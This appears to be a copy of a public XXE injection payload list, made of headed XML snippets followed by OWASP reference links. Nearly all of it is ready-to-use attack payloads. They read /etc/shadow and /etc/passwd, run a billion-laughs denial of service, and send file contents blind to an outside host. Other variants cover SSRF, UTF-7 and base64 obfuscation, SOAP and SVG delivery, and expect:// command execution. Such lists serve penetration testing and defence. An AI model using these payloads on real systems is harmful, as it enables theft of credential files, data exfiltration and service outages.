##### XML External Entity (XXE) Injection Payloads

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-basic-xml-example)XXE: Basic XML Example

```
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-entity-example)XXE: Entity Example

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-file-disclosure)XXE: File Disclosure

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-denial-of-service-example)XXE: Denial-of-Service Example

```
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-local-file-inclusion-example)XXE: Local File Inclusion Example

```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-blind-local-file-inclusion-example-when-first-case-doesnt-return-anything)XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-access-control-bypass-loading-restricted-resources---php-example)XXE: Access Control Bypass (Loading Restricted Resources - PHP example)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxessrf--server-side-request-forgery--example)XXE:SSRF ( Server Side Request Forgery ) Example

```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-remote-attack---through-external-xml-inclusion-exmaple)XXE: (Remote Attack - Through External Xml Inclusion) Exmaple

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz><lol>3..2..1...&test<lol></lolz>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-utf-7-exmaple)XXE: UTF-7 Exmaple

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-base64-encoded)XXE: Base64 Encoded

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-xxe-inside-soap-example)XXE: XXE inside SOAP Example

```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

###### [](https://github.com/payloadbox/xxe-injection-payload-list#xxe-xxe-inside-svg)XXE: XXE inside SVG

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

#### [](https://github.com/payloadbox/xxe-injection-payload-list#references-)References :

👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)

👉 [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

👉 [Testing for XML Injection (OTG-INPVAL-008)](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008))